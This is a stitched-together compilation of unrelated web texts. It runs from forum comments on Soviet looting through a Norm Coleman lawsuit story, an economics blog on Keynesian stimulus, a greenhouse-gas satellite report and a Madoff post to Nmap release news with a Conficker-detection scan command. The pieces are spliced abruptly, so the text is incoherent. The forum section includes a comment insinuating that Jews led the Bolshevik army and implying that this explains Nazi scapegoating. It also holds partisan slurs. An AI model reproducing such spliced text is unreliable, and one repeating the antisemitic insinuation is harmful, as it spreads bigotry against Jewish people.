It was the logic of capitalism at its worst , and an excellent demonstration of how capitalist priorities can undermine democratic ethics .
Someone was going to make money selling weapons and supplies to the Soviets , European statesmen reasoned , so it might as well be us .
The Germans reached the same conclusion , signing the Treaty of Rapallo with the USSR in 1922 , just a year after the German Communist Party had tried to overthrow the Weimar government .
Historys Greatest Heist is filled with vivid images of theft and spoliation , of warehouses full of jewels and briefcases stuffed with rubles .
But the real value of the book is that it shows just how well the West lived up to Lenins cynical prophecy :  The capitalists will sell us the rope with which to hang them . 

That is what Socialism / Communism is all about : theft .
Stealing other people ’s property and giving it to your friends .
That is all is ever has been .
Think of it as Organized Crime on a massive level .

The Communists confiscated all the gold and silver plate , jeweled icons and furniture from every church , convent and monastery in Russia and turned the siezed property into stables and warehouses to humiliate the believers .
Most of the priests and nuns were sent to gulags where almost all died or were murdered .
One of the reasons the Germans were greeted with open arms in the early part of World War 2 by a large portion of the Russian , Ukrainian and White Russian populations was because as soon as they reached a major population center they reopened the churches .
This changed in the later years after Nazi party fanatics replaced the Wehrmacht .

For example , the following also describes today 's free - market extremists ' rationale for trading with China , or the justification for selling wheat to the Soviet Union in the 1960s and 70s :
It was the logic of capitalism at its worst , and an excellent demonstration of how capitalist priorities can undermine democratic ethics .
Someone was going to make money selling weapons and supplies to the Soviets , European statesmen reasoned , so it might as well be us .
And this is true of today 's American socialists ( Demonrats ) as well : their first act on seizing power ... was deliberately to destroy Russias economy , leaving the regime wholly dependent on foreign financing ... the Bolsheviks had not the slightest idea how a modern economy or financial system worked .

No surprise here , just specifics .
Russia was the wealthiest nation in the world in 1917 .
It is a crime , and articles that can be identified ought to be returned either to the heirs or barring that , the Russian people .
They will never get back their plundered gold .
You just wonder which banks it 's sitting in now .
And some other little facts about the revolution early on are n't in the history books and should n't be discussed .
All is not fair in love of war ( pun intended ) .
Maybe there is a method to the madness behind what seems to be starting here .

Great summary article .
The quotation by Lenin about the capitalists selling rope is , I believe , mythical .
It has never been adequately traced to a reliable source .
However , it is apt .
It is also just to clever a saying for Lenin , who ( judging from his writings ) was a particularly boring fellow .

Sorry to call you out Aliska , but I do n’t think Russia was the wealthiest country in the world in 1917 .
My understanding is that the USA , Germany , China , and Great Britain were all wealthier , with the USA , Germany and Great Britain wealthier per capita as well as in gross national product and China with a lower per capita income and wealth .

I must be mistaken about that because I can't find it on google , thought I 'd read it somewhere .

Tell it to the Spanish The term Moscow Gold ( Spanish : Oro de Moscú ) , or alternatively , Gold of the Republic ( Spanish : Oro de la República ) , refers to the operation by which 510 tonnes of gold , corresponding to approximately three - fourths of the total gold reserves of the Bank of Spain , were transferred from their original location in Madrid to the Soviet Union a few months after the outbreak of the Spanish Civil War ; the term also encompasses the subsequent issues relating with its sale to the USSR and the usage of the funds obtained .
The term also refers to the sending of other similar goods confiscated during the ongoing conflict by order of the government of the Second Spanish Republic , presided by Francisco Largo Caballero , through the initiative of his Minister of Finance , Juan Negrín .
The remaining fourth of the Bank 's gold reserves , 193 tonnes , was transported and exchanged into currency in France , operation which is also known by analogy as the " Paris Gold " .
* * * 15,571 sacks of gold were opened , and 16 different types of gold coins were found inside : sterling pounds ( 70 % of the total ) , Spanish pesetas , French francs , Louis , German marks , Belgian francs , Italian liras , Portuguese escudos , Russian rubles , Austrian schillings , Dutch guilders , Swiss francs , Mexican pesos , Argentine pesos , Chilean pesos , and an extraordinary amount of U.S. dollars .
The total deposit was constituted of 509,287.183 kilograms of gold coins and 792.346 kilograms of gold in the form of ingots : thus , a total of 510,079,529.30 grams of alloyed gold , which at an average of .900 millesimal fineness , was equivalent to 460,568,245.59 grams of fine gold ( approximately 14,807,363.8 troy ounces ) .
This amount of gold was valued at 1,592,851,910 gold - pesetas ( 518 millions of U.S dollars ) .
Additionally , the numismatic value of the coins was much higher than the amount of gold they contained , but the Soviets disregarded this when calculating its value .

I read somewhere that the top 500 officers in the Bolshevik army were Jews ..... the Jews were made the scapegoats in Nazi Germany for many reasons ..... one of them could have been that the Germans and probably a lot of Europeans were resentful and afraid of the Jews and in what they did in Russia .... the least of that was stealing artwork ...

Alexander Ovechkin Needs Driving Lessons
Total Pro Sports -
The Washington Capitals need to do a better job of keeping Alexander Ovechkin and Mike Green away from golf carts .
The two Capitals young guns were filming a spot for NHL.com and it looks like they had a close call with a garage door .
I do n’t know if it was staged , but OV almost takes his own head off .
Ovechkin is great hockey player , yet his driving skills are sub-par .
If I were the Caps I would keep this guy in a bullet proof case when he is not on the ice .
I think that a player as good as OV should refrain from such dangerous actives , the last thing the Caps need is for this guy to be injured in a golf cart related accident .
If you do n’t think golf carts are dangerous , just ask Eric Johnson of the St. Louis Blues .

ST . PAUL ( AP ) 
A new court filing in Texas seeks to suspend a lawsuit alleging that a friend and donor of Republican Norm Coleman tried to improperly steer money to the then - U.S. senator .
The filing this week by attorneys representing Deep Marine Technology Inc. said the lawsuit by the company 's former chief executive officer should be put on hold for at least two months .
The court document said that would afford time for a special investigation commissioned by the company 's board .
The plaintiff 's lawyer said he will oppose the request .
THIS WEEK : Franken declares Senate win in Minn .
Among other things , former company executive Paul McKim alleges that a Coleman benefactor sought to funnel $ 75,000 to the Minnesota Republican through a Minneapolis - based insurance company where Coleman 's wife works .
The donor , Minnesota businessman Nasser Kazeminy , is a shareholder in the Texas company .
Kazeminy has denied the allegations .
Coleman has insisted that he knew nothing of any financial arrangement nor did he benefit from one .
He is not a party to the case .
Coleman argues the late - October lawsuit was politically timed .
It rocked his race with Democratic challenger Al Franken on the final weekend .
Coleman is engaged more directly on a legal front related to the Minnesota Senate seat .
He is contesting his recent 225 - vote recount loss to Franken , arguing that the count was flawed because some ballots were wrongly excluded and others improperly included .
The election court case could drag on for months .
In the new Texas filing , attorneys representing Deep Marine 's interests also said that McKim did n't follow the proper steps for bringing his case nor has he been accessible since lodging the charges .
" Paul McKim figures prominently in the investigation , and has to date refused to cooperate in giving a deposition , " the filing said .
McKim 's attorney , Casey Wallace , disputed that claim .
He said McKim will submit to a sworn deposition in the normal course of the court case .
Wallace said he will object to an attempt to slow the case .
" Their investigatory time has surely passed .
This is not a complicated case and we do n't think that anything needs to be stayed so an investigation can be conducted , " Wallace said .
" The investigation should have already been wrapped up . "
The original lawsuit — and a second one filed by company shareholders in Delaware — accused Kazeminy of pressuring company officials to make multiple $ 25,000 payments to Hays Companies , a Minneapolis insurance firm that employed Laurie Coleman .
Hays officials have said the company provided risk management consulting services to Deep Marine Technology and that Laurie Coleman received no money related to those services .
The earliest the motion to put off the lawsuit will be considered is Jan. 19 .
If granted , the lawyers hired to look into activities at Deep Marine would have to keep the court apprised of the progress of the probe .
But it might be up to the company 's board to determine whether any findings or evidence in the internal investigation are made public .

I am a big fan of Willem Buiter , even on those rare occasions when he is wrong .
He is unusually blunt for a Serious Economist , and is willing to take on orthodox views and institutions frontally .
He has , for instance , been quite critical of the Fed .
He created a firestorm at its last conference in Jackson Hole when , in a presentation , he lambasted the central bank for what he called “ cognitive regulatory capture ” .
That should n’t have been a surprise ; Buiter had made that observation , forcefully , months ago .
But the hosts must have operated under the delusion that Buiter would be deferential rather than speak his mind .
Buiter takes on another bit of orthodoxy today , and it ’s a doozy .
“ Can the US economy afford a Keynesian stimulus ? ”
And the headline is anodyne compared to the text .
It ’s important to stress how much Buiter ’s post is at odds with conventional wisdom , at least among economists .
A whole host of credentialed writers have lined up , shoulder to shoulder , to defend massive deficit spending as the way to get the US out of its economic meltdown .
For instance , Paul Krugman , staunch advocate of spending , is so convinced of the validity of his opinion that he adopts a dismissive posture towards opponents ( he has elsewhere called them “ niggling nabobs of negativism “ :
Here ’s how I see it : the opponents of a strong stimulus plan do n’t really have an alternative to offer .
They do n’t even have a really coherent critique ; as Brad DeLong points out , if you believe that a surge in private spending would raise employment — and even the critics agree on that — it ’s very hard to explain why a surge of public spending would n’t have the same effect .
Update 1:45 AM : Krugman makes an even more strident case in today ’s New York Times op - ed , “ Fighting Off Depression . ”
Back to the original pos† .
True , there are a few naysayers , like Tyler Cowen , who plaintively contends that the evidence for the effectiveness for stimulus is thin and adds :
My view is the disaggregated one that sometimes private spending can stimulate employment and sometimes it cannot .
Private spending has the greatest chance of stimulating employment when a ) market psychology is on its side , and b ) the financial system is relatively well - functioning .
Neither is the case right now .
Note that under standard theory neither monetary nor fiscal policy will set right the basic problems from negative real shocks and indeed the U.S. economy is undergoing a series of massive sectoral shifts .
That includes a move out of construction , a move out of finance , a move out of debt - financed consumption , a move out of luxury goods , the collapse of GM , and a move out of industries which cannot compete with the internet ( newspapers , Borders , etc . )
I ’ve never seen a stimulus proponent deny this point about real shocks but I do n’t see them emphasizing it either .
It should be the starting point for any analysis of fiscal policy but so far it is being swept under the proverbial rug .
Buiter tackles the problem from a different angle .
He looks at the standing of the US in the world , economically and financially .
He does not argue the Cowen angle , that deficit spending might not lead to growth .
His point is different : the US is pretty close to the end of its rope , in terms of relying on the rest of the world for financing .
He sees it as a no - brainer that a massive fiscal deficits , whether they are narrowly successful or not , will relatively soon ( he estimates 2 to 5 years ) lead to a collapse in prices of dollar denominated assets .
Now that point of view might not seem radical ; some investors have spoken for some time of the likelihood of a dollar implosion .
But among respectable economists , this would have been treated as a lunatic fringe view .
But Buiter makes his argument using data and recognized economic constructs .
I am particularly taken with the intro to Buiter ’s piece :
Economic policy is based on a collection of half - truths .
The nature of these half - truths changes occasionally .
Economics as a scholarly discipline consists in the periodic rediscovery and refinement of old half - truths .
Little progress has been made in the past century or so towards understanding how economic policy , rules , legislation and regulation influence economic fluctuations , financial stability , growth , poverty or inequality .
We know that a few extreme approaches that have been tried yield lousy results – central planning , self - regulating financial markets – but we do n’t know much that is constructive beyond that .
The main uses of economics as a scholarly discipline are therefore negative or destructive – pointing out that certain things do n’t make sense and wo n’t deliver the promised results .
This blog post falls into that category .
An elite economist who is willing to say that economists really do n’t know all that much deserves a hearing just for his commitment to intellectual integrity .
As Will Rogers said , “ it is n’t what you do n’t know that will hurt you , it ’s what you know that ai n’t so . ”
Questioning accepted wisdom is vitally important , yet too often dissenters are ignored and marginalized .
It is going to be very interesting whether Buiter ’s comments are addressed by the economists supporting the Obama program , or are politely ignored .
His post is quite long , I strongly urge you to read it in its entirety , and I excerpt key sections below :
Much bad policy advice derives from a misunderstanding of the short - run and long - run impacts of events and policies .
Too often for comfort I hear variations on the following statements : “ the long run is just a sequence of short runs , so if we make sure things always make sense in the short run , the long run will take care of itself . ”
This fallacy , which I shall , unfairly , label the Keynesian fallacy , compounds three errors .
The first error is the leap from the correct assertion that a long interval of time is the sum of successive short intervals of time to the incorrect impact that the long - run impact of a policy or event is in any sense the sum of its short - run impacts .
The second error is the failure to recognise that our models ( formal or implicit ) of how the economy works are inevitably incomplete .
Parts of the transmission mechanism – positive or negative feedbacks and other causal links between actions today , future outcomes and anticipations today of future outcomes and future actions – that can safely be ignored when we consider the impact of a policy over a year or two can come back to haunt us with a vengeance over a three - year or longer horizon .
The third error is that , when economic agents , households , firms , portfolio managers and asset market prices are even in part forward - looking , the long run is now .
More precisely , the long - run consequences of current policies can , through private sector expectations and through forward - looking asset prices influence consumption behaviour , employment and investment decisions and asset prices today .
Matching the Keynesian fallacy is the view that just because a certain set of policies is not sustainable , in the sense that it cannot be maintained indefinitely , such policies should not be implemented even temporarily .
I will call this the sustainability fallacy …..
Yves here .
One of Buiter ’s weaknesses , having been in elite policy roles at various points in his career , is sometimes to expect more of government than it can deliver .
The real danger , in my mind , of policies that ought to be temporary , is that political processes and human inertia mean that they do not get reversed quickly enough .
For instance , Janet Yellin today noted ( in effect ) that the Fed has no exit program for its fancy alphabet soup of facilities even though they were all supposed to be temporary .
If the Fed is afflicted with this problem , imagine how hard it is to turn off programs that are implemented via legislation .
That does not mean that they should not be tried , but in evaluating them , one needs to take a hard look at what happens if they persist well past their sell - by date .
Back to Buiter ( boldface ours ) :
First , the fiscal policy actions pursued thus far by the Bush administration , but even more so the policy proposals leaked by Obama ’s proto-administration are afflicted by the Keynesian fallacy on steroids .
They appear to exist outside time , with neither the long - run consequences of the actions like to be implemented over the next couple of years , nor the history that brought the US to its current predicament , the initial conditions , being given any serious attention … .
Even before the crisis erupted , around the middle of 2007 , the US economy was in fundamental disequilibrium .
The external primary deficit ( the external current account deficit plus US net foreign investment income ) was running at around five or six percent of GDP .
The US was also a net external debtor , Its net external investment position ( at fair value , or the statisticians best guess at it ) was somewhere between minus 20 percent and minus 30 percent of annual GDP .
The US economy managed to finance this debt and deficit position quite comfortably because it gave foreigners an atrocious rate of return on their investment in the US – a rate of return much lower , when expressed in a common currency , than the rate of return earned by US - resident investors abroad …..
The past eight years of imperial overstretch , hubris and domestic and international abuse of power on the part of the Bush administration has left the US materially weakened financially , economically , politically and morally .
Even the most hard - nosed , Guantanamo - bay - indifferent potential foreign investor in the US must recognise that its financial system has collapsed .
Key wholesale markets are frozen ; the internationally active part of its financial system has either been nationalised or underwritten and guaranteed by the Federal government in other ways .
Most market - mediated financial intermediation has ground to a halt , and the Fed is desperately trying to replace private markets and financial institutions to intermediate between households and non-financial operations .
The problem is not confined to commercial banks , investment banks and universal banks .
It extends to insurance companies ( AIG ) , Quangos ( a British term meaning Quasi- Autonomous Government Organisations ) like Fannie Mae and Freddie Mac , amorphous entities like GEC and GMac and many others .
The legal framework for the regulation of financial markets and institutions is a complete shambles .
Even given the dismal state of the legal framework , the actual performance of key regulators like the Fed and the SEC has been appalling , with astonishing examples of incompetence and regulatory capture .
There is no chance that a nation as reputationally scarred and maimed as the US is today , could extract any true ‘ alpha ’ from foreign investors for the next 25 years or so .
So the US will have to start to pay a normal market price for the net resources it borrows from abroad .
It will therefore have to start to generate primary surpluses , on average , for the indefinite future .
A nation with credibility as regards its commitment to meeting its obligations could afford to delay the onset of the period of pain .
It could borrow more from abroad today , because foreign creditors and investors are confident that , in due course , the country would be willing and able to generate the ( correspondingly larger ) future primary external surpluses required to service its external obligations .
I do n’t believe the US has either the external credibility or the goodwill capital any longer to ask , Oliver Twist - like , for a little more leeway , a little more latitude .
I believe that markets – both the private players and the large public players managing the foreign exchange reserves of the PRC , Hong Kong , Taiwan , Singapore , the Gulf states , Japan and other nations – will make this clear .
There will , before long ( my best guess is between 2 and 5 years from now ) be a global dumping of US dollar assets , including US government assets .
Old habits die hard .
The US dollar and US Treasury Bills and Bonds are still viewed as a safe haven by many .
But learning takes place .
The notion that the US Federal government will be able to generate the primary surpluses required to service its debt without selling much of it to the Fed on a permanent basis , or that the nation as a whole will be able to generate the primary surpluses to service the negative net foreign investment position without the benefit of ‘ dark matter ’ or ‘ American alpha ’ is not credible … .
The US Federal government has taken on massive additional contingent liabilities through its bail out / underwriting of the US financial system ( and possibly other bits of the US economic system that are too politically connected to fail ) .
Together will the foreseeable increase in actual Federal government liabilities because of vastly increased future Federal deficits , this implies the need for a future private to public sector resource transfer that is most unlikely to be politically feasible without recourse to inflation .
The only alternative is default on the Federal debt .
There is little doubt , in my view , that the Federal authorities will choose the inflation and currency depreciation route over the default route .
If I can figure this out , so can anyone in the US or abroad who follows recent economic developments .
The dawning of the realisation will lead to the dumping of the assets … .
I now anticipate a Federal deficit of between $ 1.5 trillion and $ 2.0 trillion for 2009 and something slightly lower for 2010 …
Those familiar with the post World War I and post - World War II public debt levels will not be impressed with even a doubling of the public ( Federal ) debt held by the public as share of GDP , from its current level of around 40 percent of annual GDP ( gross public debt , including debt held by other government agencies , like the Social Security Trust Fund , stands at around 70 percent of GDP ) ….. Following World War II public debt stood at more than 100 percent of annual GDP .
That , however , was then .
The debt was incurred to finance a temporary bulge in public spending motivated by a shared cause : defeating Japan and the Nazis .
The current debt is the result of the irresponsibility , profligacy and incompetence of some .
Achieving a political consensus to raise taxes or cut spending to restore US government solvency is going to test even the talents of that Great Communicator , Barack Obama …..
So will the Keynesian demand stimulus work ?
For a while ( a couple of years , say ) it may .
When the consequences for the public debt of both the Keynesian stimulus and the realisation of the losses from the assets and commitments the Fed and the Treasury have taken onto their balance sheets become apparent , the demand stimulus will fade and may be reserved as precautionary behaviour takes over in the private sector .
My recommendation is to go easy on the fiscal stimulus .
The US government is ill - placed financially and fiscally , to engage in short - term fiscal heroics .
All they can really do is pray for a stronger - than - expected revival of global demand , without any major stimulus from the US …
Given the bad fiscal position of the US Federal government and given the vulnerability of the external position of the US and its growing reliance on foreign funding , the scope for expansionary fiscal policy in the US is much more limited than president - elect Obama ’s advisers appear to realise .
Underneath the effective demand problem is a deep structural rot , especially in household sector and financial sector balance sheets .
Keynesian cyclical policy options that would be open to more structurally sound economies should therefore not be tried on anything like the same scale by the US authorities .
There is plenty more here .

The Japanese government has launched the first satellite to monitor greenhouse gases worldwide .
This tool will help scientists better ascertain where global warming emissions are coming from and how much is being absorbed by the oceans and forests .
The U.S. will launch a similar orbiter next month .
The Japanese satellite represents a big step in getting such data on carbon dioxide and methane in the atmosphere , which is now compiled from scattered ground stations .
There are normally 100 observations every two weeks , but with the satellite , there be about one million .
This enormous leap is an integral part of understanding greenhouse emissions and to see which countries are emitting more than others .
Global warming is one of the most dire issues facing the international community , and Japan ’s actions show that it is fully committed to reducing CO2 .
The satellite , named “ Ibuki , ” which means “ breath , ” was sent into orbit along with seven other piggyback probes on a Japanese H2A rocket .
JAXA , Japan ’s space agency , said the launch was a success , and officials said they were monitoring the satellites to ensure they entered orbit properly .
Ibuki a will circle the globe every 100 minutes an is equipped with optical sensors that measure reflected light from the Earth to determine the density of the two gases .
Carbon dioxide is the biggest contributor to global warming .
It is emitted by the burning of fossil fuels by power plants , motor vehicles and other sources .
Methane has a variety of sources , including livestock manure and rice cultivation .
International science agencies have reported that carbon dioxide emissions have risen three percent worldwide from 2006 to 2007 .
A United Nations scientific panel has warned that if emissions are not reined in , average global temperatures will increase by four to 11 degrees Fahrenheit ( 2.4 to 6.3 degrees Celsius ) by the year 2100 , causing damaging disruptions to the climate .
Scientists currently depend on 282 land - based stations and scattered instrumented aircraft flights to monitor carbon dioxide at low altitudes .
Ibuki , orbiting at an altitude of about 415 miles , will be able to check gas levels in entire columns of atmosphere at 56,000 locations .
The upcoming NASA satellite , the Orbiting Carbon Observatory , will have more precise measurements because it will check only one gas , carbon dioxide .
Its smaller observational target area will mean less chance of clouds contaminating sample results .

Bernard Madoff 's alleged $ 50 billion fraud is another interesting example of the limits of governments to enforce their own rules .
As this opinion piece in today ’s Wall Street Journal argues , in spite of the huge increase in the SEC ’s budget since the fall of Enron ( from $ 377 m to $ 900 m ) and its army of staff devoted to enforcement , they did n’t notice that perhaps the most successful hedge funds manager was a fraud ( when many people in the industry suspected as much ) .
In the current times , there is little hope that governments will take notice of their own failures , and draw the right conclusions .
SEC failures give credence to Peter Boettke ’s project on anarchy .
Anarchy as a Research Program should be high on the Austrian agenda .
The more rules governments must enforce , the less they will be able to do so adequately .
Instead , one should rely on the incentives people have to successfully enforce the arrangements they themselves establish or on the reputation of others to enforce those arrangements .
As the WSJ puts it :
The fact is that the only people who seem to have taken concrete action to protect investors from Mr. Madoff are private research shops like Aksia LLC .
Its analysts did the real work of figuring out that Mr. Madoff 's claimed investment strategy could n't be happening at the volumes he claimed to be trading .
Likewise , it was the short sellers who first blew the whistle on Enron , while the SEC was clueless and the firm 's auditors were asleep .
The SEC not only aims at stopping activities that are generally legitimate and desirable , but when there are cases of actual fraud , the SEC ca n’t stop them .
The SEC is another agency that should be abolished .
Again , one can only agree with the WSJ and prepare for more useless public spending :
Lets say that in highschool :

Nmap 4.85BETA7
Released to Scan for Conficker Worm
The Conficker worm is receiving a lot of attention because of its vast scale ( millions of machines infected ) and advanced update mechanisms .
Conficker is n't the end of the Internet ( despite some of that hype ) , but it is a huge nuisance we can all help to clean up .
Thanks to excellent research by Tillmann Werner and Felix Leder of The Honeynet Project and implementation work by Ron Bowes , David Fifield , Brandon Enright , and Fyodor , we 've rolled out a new Nmap release which can remotely scan for and detect infected machines .
Nmap 4.85BETA7 is now available from the download page , including official binaries for Windows and Mac OS X .
To scan for Conficker , use a command such as :
nmap -PN - T4 - p139,445 -n - v -- script smb-check-vulns,smb-os-discovery -- script-args safe=1 [ targetnetworks ]
You will only see Conficker - related output if either port 139 or 445 are open on a host .
A clean machine reports at the bottom : “ Conficker : Likely CLEAN ” , while likely infected machines say : “ Conficker : Likely INFECTED ” .
For more advice , see this nmap - dev post by Brandon Enright .
While Conficker gets all the attention , 4.85BETA7 also has many other great improvements .
Update : Changed version from 4.85BETA5 ( first to detect Conficker ) to 4.85BETA7 , which includes further Conficker detection improvements , among other changes .

Nmap 4.75 Released
We are pleased to release Nmap 4.75 , with almost 100 significant improvements since version 4.68 .
Key Nmap 4.75 changes include :
Fyodor spent much of this summer scanning tens of millions of IPs on the Internet ( plus collecting data contributed by some enterprises ) to determine the most commonly open ports .
Nmap now uses that empirical data to scan more effectively .
Zenmap Topology and Aggregation features were added , as discussed in the next news item .
Hundreds of OS detection signatures were added , bringing the total to 1,503 .
Seven new Nmap Scripting Engine ( NSE ) scripts were added .
These automate routing AS number lookups , “ Kaminsky ” DNS bug vulnerability checking , brute force POP3 authentication cracking , SNMP querying and brute forcing , and whois lookups against target IP space .
Many valuable libraries were added as well .
Many performance improvements and bug fixes were implemented .
In particular , Nmap now works again on Windows 2000 .
Many of these changes were discussed in Fyodor 's Black Hat and Defcon presentations .
The audio and video has now been posted on the presentations page .
Download the source tarball or binaries for Linux , Windows , or Mac OS X from the Nmap download page .
If you find any bugs , please report them .
Zenmap Gains Topology Maps and Aggregation Features
While Nmap stands for “ Network Mapper ” , it has n't been able to actually draw you a map of the network — until now !
The new Zenmap Network Topology feature provides an interactive , animated visualization of the hosts on a network and connections between them .
The scan source is ( initially ) in the center , with other hosts on a series of concentric circles which represent the number of hops away they are from the souce .
Nodes are connected by lines representing discovered paths between them .
Read the full details ( and oogle the pretty pictures ) in our article on Surfing the Network Topology .
Special thanks go to João Medeiros , David Fifield , and Vladimir Mitrovic for their tireless work in developing and integrating this new feature .
Another exciting new Zenmap feature is scan aggregation , which allows you to combine the results of many Nmap scans into one view .
When one scan is finished , you may start another in the same window .
Results of the new scan are seamlessly merged into one view .
You can try these and many other great features with the latest version of Zenmap , available from the Nmap download page .
Nmap Summer News Roundup
Fyodor spoke in Las Vegas at the Black Hat Briefings and Defcon to discuss the results of large - scale Internet scans he has been conducting , and demonstrate how you can use the empirical data to make your scans ( over the Internet or even internal ) more efficient .
He also showed off some new Nmap features which can help you bypass firewall restrictions , reduce scan times , and gather more information about remote hosts .
The presentation video is now available on the presentations page .

Nmap Celebrates 10th Anniversary With Major Version 4.50 Release
After nearly two years of work since the 4.00 release , Insecure .
Org is pleased to announce the immediate , free availability of the Nmap Security Scanner version 4.50 from https://nmap.org .
Nmap was first released in 1997 , so this release celebrates our 10th anniversary !
Major new features since 4.00 include the Zenmap cross- platform GUI , 2nd Generation OS Detection , the Nmap Scripting Engine , a rewritten host discovery system , performance optimization , advanced traceroute functionality , TCP and IP options support , and nearly 1,500 new version detection signatures .
Dozens of other important changes — and future plans for Nmap — are listed in the release announcement .
We recommend that all current Nmap users upgrade .
Update : Joe Barr at Linux .
Com has written a great review of Nmap 4.50 .
In addition to testing the new features , he offers substantial background information on port scanning .
Nmap Featured in The Bourne Ultimatum
In The Bourne Ultimatum ( IMDB ) , the CIA needs to hack the mail server of a newspaper ( The Guardian UK ) to read the email of a reporter they assassinated .
So they turn to Nmap and its new official GUI Zenmap to hack the mail server !
Nmap reports that the mail server is running SSH 3.9p1 , Posfix smtpd , and a name server ( presumably bind ) .
They also make substantial use of Bash , the Bourne - again shell .
Congratulations to Roger Chui for being the first to spot this .
He also sent a scene transcript and the following HD screen shots ( click for full resolution ) :
Other movies which have used Nmap include : Matrix Reloaded , Bourne Ultimatum , 13 : Game of Death , Battle Royale , The Listening , and , uhh , HaXXXor : No Longer Floppy .
Screens shots of Nmap in all of these movies are available on our new Nmap movies page .
Nmap has become quite the movie star !
Introducing Zenmap , the Official Nmap GUI
After more than two years of development ( starting with a 2005 Google Summer of Code project ) , we have replaced the venerable but dated NmapFE with a new cross- platform GUI named Zenmap .
It is cross platform ( tested on Linux , Windows , Mac OS X ) and supports all Nmap options .
Its results viewer allows easier browsing , searching , sorting , and saving of Nmap results .
Zenmap will appear in the upcoming 4.50 release and is already available in the release candidate packages on the Nmap download page .
Zenmap screenshots and documentation are available at https://nmap.org/zenmap.
Zenmap is still under active development , but was integrated early because it is already much more powerful than NmapFE .
Development is coordinated on the nmap - dev mailing list .
Nmap Featured in Die Hard 4
Yippee Ki-Yay !
In Die Hard 4 : Live Free or Die Hard ( Wikipedia , IMDB ) , Detective John McClane ( Bruce Willis ) is dispatched to retrieve hacker Matthew Farrell ( Justin Long ) because the FBI suspects him of breaching their computer systems .
Later , Justin is enlisted to help thwart terrorist mastermind Thomas Gabrial 's attempts at total World destruction .
In this Scene , Farrell demonstrates his Nmap skills :

New Nmap Man Page
We are proud to announce that the Nmap man page has been completely rewritten .
It is more comprehensive ( double the length ) and much better organized than the previous one .
It is meant to serve as a quick - reference to virtually all Nmap command - line arguments , but you can learn even more about Nmap by reading it straight through .
The 18 sections include Brief Options Summary , Firewall / IDS Evasion and Spoofing , Timing and Performance , Port Scanning Techniques , Usage Examples , and much more .
It even documents some cool features that are slated for release in the next Nmap version ( runtime interaction and parallel DNS resolution ) .
The new man page is best read in HTML format , though you can alternatively download the Nroff nmap . 1 to install on your system .
We have issued a call for translations of the reference guide , and 29 languages are in progress .
See the new documentation page to volunteer or read a translation .
Hacker Fiction Books Published
Fyodor has co-authored a novel on hacking , along with FX , Joe Grand , Kevin Mitnick , Ryan Russell , Jay Beale , and several others .
Their individual stories combine to describe a massive electronic financial heist .
While the work is fiction , hacks are described in depth using real technology such as Nmap , Hping2 , OpenSSL , etc. Stealing the Network : How to Own a Continent can be purchased at Amazon ( save $ 17 ) , and your can read Fyodor 's chapter online for free .
STC was a best - seller , ranking for a while as the second - highest selling computer book on Amazon .
Update : Syngress has released a sequel : Stealing the Network : How to Own an Identity .
They have generously allowed Fyodor to post his favorite chapter for free .
So enjoy Bl@ckTo\ / \/ 3r , by Nmap contributor Brian Hatch .
It is full of wry humor and creative security conundrums to keep the experts entertained , while it also offers security lessons on the finer points of SSH , SSL , and X Windows authentication and encryption .
Nmap Gains Advanced Version Detection
After several months of intense private development , we are pleased to release Nmap 3.45 , including an advanced version detection system .
Now instead of using a simple nmap - services table lookup to determine a port 's likely purpose , Nmap will ( if asked ) interrogate that TCP or UDP port to determine what service is really listening .
In many cases it can determine the application name and version number as well .
Obstacles like SSL encryption and Sun RPC are no threat , as Nmap can connect using OpenSSL ( if available ) as well as utilizing Nmap 's RPC bruteforcer .
IP v6 is also supported .
You can read our new version detection paper for the details and examples , or just download the latest version and try it out here .
Simply add " - sV " to your normal scan command - line options .
News articles covering Nmap version detection : Slashdot , Hacking Linux Exposed , Security Wire Digest .
Nmap Featured in The Matrix Reloaded
We have all seen many movies like Hackers which pass off ridiculous 3D animated eye - candy scenes as hacking .
So I was shocked to find that Trinity does it properly in The Matrix Reloaded [ Under $ 6 at Amazon ] .
She whips out Nmap version 2.54BETA25 , uses it to find a vulnerable SSH server , and then proceeds to exploit it using the SSH1 CRC32 exploit from 2001 .
Shame on them for being vulnerable ( timing notes ) .
Congratulations to everyone who has helped make Nmap successful !

I ’m an avid reader of fiction and just love a novel that transports me , that is so gripping that I ca n’t put it down .
But I also enjoy a good non-fiction book , from self - help stuff to philosophy to biographies to just about anything that makes me think .
After the warm reception of my post on novels ( 50 Amazing and Essential Novels to Enrich Your Library ) , a number of people asked for a list of non-fiction as well .
Well , here it is !
I was hesitant to do this as there are so many classic non-fiction texts , from the Greeks to philosophers through the ages to biographies of amazing people to first - hand accounts of surviving wars and much more .
It ’s overwhelming , and it would be hard to be comprehensive .
But then I decided not to be comprehensive .
Instead , I wanted to find 20 books that convey some of the philosophy of Zen Habits in different ways , books that influenced this site and that I think will enrich your library and your life if you have n’t read them yet .
So this list is far , far from being authoritative or comprehensive .
It leaves off just about every classic work — histories , philosophy works , scientific classics , and so on .
It does n’t have the autobiography of Benjamin Franklin , anything by Descartes or Nietzsche or Kant , accounts by Anne Frank or slaves , or anything else on the 100 Best Non-fiction Books list .
Not that those books do n’t hold great value — they do — but they ’ve been done elsewhere .
This list is just a few of my favorites .
I hope you enjoy them , find inspiration from them , and share some of your favorites in the comments below !
Bonus update — I forgot a few that I really want to add to this list .
So here are a few more books :
So there are hundreds and thousands of great non-fiction books that I ’ve left off this list , mostly because I do n’t have the time to compile a bigger list , and also largely because there are so many I have n’t read personally .
It ’s not enough to say that markets could freeze up , loans could become impossible to get and the economy could slide into its worst downturn since the Great Depression .
For now , the crisis has had little effect on most Americans , beyond their 401 ( k ) statements .
So to them , the specter of a depression can sound alarmist , and the $ 700 billion bill that Congress voted down this week can seem like a bailout for rich scoundrels .
Mr. Bernanke and his fellow worriers need to connect the dots .
They need to use their bully pulpits to teach a little lesson on the economics of a credit crisis — how A can lead to B , B to C and C to Depression .
Let ’s give it a shot , then .
•
Why are we talking about the Depression , anyway ?
Almost no economist thinks that even a terrible downturn would look like the Depression .
The government has already responded more aggressively than it did in Herbert Hoover ’s day .
So a Depression - like contraction — a 30 percent drop in economic activity — is highly unlikely .
The country is also far richer today , which means that a much smaller portion of the population is living on the edge of despair .
No matter what happens , you ’re not likely to see shantytowns .
But the Depression is still relevant , because the basic mechanics of how the economy might fall into a severe recession look quite similar to those that caused the Depression .
In both cases , a credit crisis is at the center of the story .
At the start of the 1930s , despite everything that had happened on Wall Street , the American economy had not yet collapsed .
Consumer spending and business investment were down , but not horribly so .
Mr Kitsmarishvili is seen as an outspoken critic of Mr Saakashvili
A former Georgian ambassador has caused uproar in Georgia by saying his country , not Russia , started August 's war over South Ossetia .
